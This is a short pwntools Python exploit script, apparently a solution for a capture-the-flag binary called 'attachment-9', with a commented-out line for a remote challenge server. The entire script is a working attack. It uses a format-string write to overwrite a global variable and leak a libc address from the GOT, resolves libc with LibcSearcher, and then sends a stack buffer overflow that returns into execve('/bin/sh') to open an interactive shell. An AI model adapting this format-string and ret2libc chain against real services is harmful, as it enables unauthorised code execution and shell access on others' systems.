from pwn import *
from LibcSearcher import *

context(log_level="debug")
context.gdb_binary = "/bin/pwndbg"
x_addr = 0x0804C030

payload = p32(x_addr)
payload += b"%1c%4$hhn"
elf = ELF("./attachment-9")
libc = ELF("./libc.so.6")

io = process("./attachment-9")
#io = connect("39.96.193.120", 10000)

libc_start_main_got = elf.got["__libc_start_main"]

payload = b"%5c%7$n%8$sa" + p32(x_addr) + p32(libc_start_main_got)

io.recvuntil(b"Hope you have a good time here.\n")
io.sendline(payload)
raw = io.recv(10)
leaked = u32(raw[5:9])
print(hex(leaked))

libc = LibcSearcher("__libc_start_main", leaked)

offset_start_main = libc.dump("__libc_start_main")
print("offset start main: ", hex(offset_start_main))
libc_base = leaked - offset_start_main
print("libc base: ", hex(libc_base))

execve_addr = libc_base + libc.dump("execve")
print("execve address: ", hex(execve_addr))
bin_sh_addr = libc_base + libc.dump("str_bin_sh")
print("/bin/sh address: ", hex(bin_sh_addr))

payload = (
    b"a" * (0x90 + 0x4)
    + p32(execve_addr)
    + b"bbbb"
    + p32(bin_sh_addr)
    + p32(0)
    + p32(0)
)
io.recvuntil(b"Input:\n")
gdb.attach(io)
io.sendline(payload)
io.interactive()
